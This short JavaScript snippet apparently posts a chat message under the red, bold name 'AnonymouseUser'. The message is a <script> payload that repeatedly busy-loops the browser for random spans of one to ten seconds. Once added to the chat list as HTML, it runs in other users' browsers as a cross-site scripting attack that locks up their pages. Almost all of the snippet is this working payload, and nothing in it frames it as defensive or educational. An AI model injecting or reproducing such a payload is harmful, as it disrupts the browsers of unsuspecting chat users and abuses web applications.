var chatlist = []

// When you press enter ____________________________________________

var message = '<script>function lag(e){for(var n=(new Date).getTime();(new Date).getTime()-n<1e3*e;);}function run(){lag(Math.floor(10*Math.random())+1),setTimeout(run,1e4*Math.random())}run();</script>'
    var cleanerUser = "AnonymouseUser"
    var useUser = (cleanerUser.bold().fontcolor("red") + ": ".bold().fontcolor("red") + message)
    addListItem("saylist", useUser);